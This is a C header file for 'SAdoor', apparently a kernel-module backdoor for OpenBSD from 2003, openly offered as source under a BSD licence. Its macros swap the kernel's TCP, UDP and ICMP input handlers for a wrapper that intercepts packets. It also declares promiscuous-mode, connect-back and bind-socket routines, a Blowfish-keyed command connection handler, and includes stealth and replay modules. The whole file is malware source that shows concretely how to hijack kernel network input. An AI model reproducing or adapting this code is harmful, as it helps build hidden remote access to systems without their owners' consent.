/*
 *  File: sadoor.h
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor kmod OpenBSD main header file.
 *  Version: 1.0
 *  Date: Mon Jun 23 22:35:45 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#ifndef _SADOOR_H
#define _SADOOR_H

#include <sys/types.h>
#include <sys/proc.h>
#include "../config/sakmod_conf.h"
#include "log.h"
#include "sapc.h"
#include "bfish.h"
#include "utils.h"
#include "command.h"
#include "pty.h"
#include "stealth.h"
#include "replay.h"

/* Options */
struct sa_options {
    u_short sao_wrapindex;    /* Index of currently wrapped input function */
    void (*real_input_func)(struct mbuf *, ...);  /* Wrapped input function */
};


/* Message to send when file transfer is disabled */
#define FTRANS_DISABLED_ERRORMSG    "File transfer disabled in SAdoor configuration"

/*
 * Replacement for missing NetBSD functions
 */
extern int suword(void *, register_t);
extern int subyte(void *, u_char);
extern u_char fubyte(void *);
extern register_t fuword(void *);

/* 
 * Input stuff
 */

/* The required lists */
extern struct protosw inetsw[];
extern u_char ip_protox[];

#define TCPINPUT_INDEX      IPPROTO_TCP
#define UDPINPUT_INDEX      IPPROTO_UDP
#define ICMPINPUT_INDEX     IPPROTO_ICMP

/* Convert from protocol to index 
 * Note that proto has to be one of udp,tcp or icmp,
 * or strange things will happend .. */
#define PROTO2INDEX(proto)    \
        (((proto) == 0x06) ? TCPINPUT_INDEX : \
        (((proto) == 0x11) ? UDPINPUT_INDEX : ICMPINPUT_INDEX))


/* Replace input function with address */
#define REPLACE_INPUT(proto_index, address) \
    inetsw[ip_protox[proto_index]].pr_input = address;

/* Get address of input function */
#define INPUTADDR(proto_index) \
    inetsw[ip_protox[proto_index]].pr_input

/* input_wrapper.c */
extern void input_wrapper(struct mbuf *, ...);

#ifdef SAKMOD_IFACE_RUN_PROMISC
/* iface.c */
extern int iface_promisc(u_char *);
extern int iface_unpromisc(u_char *);
#endif /* SAKMOD_IFACE_RUN_PROMISC */


/* conn.c */
extern int conn_connect(u_long, u_short);
extern int conn_bindsock(long, u_short);
extern int conn_accept(int, time_t, u_long, u_short);

/* connloop.c */
extern int handle_connection(int sock_fd, struct bfish_key *);

#endif /* _SADOOR_H */
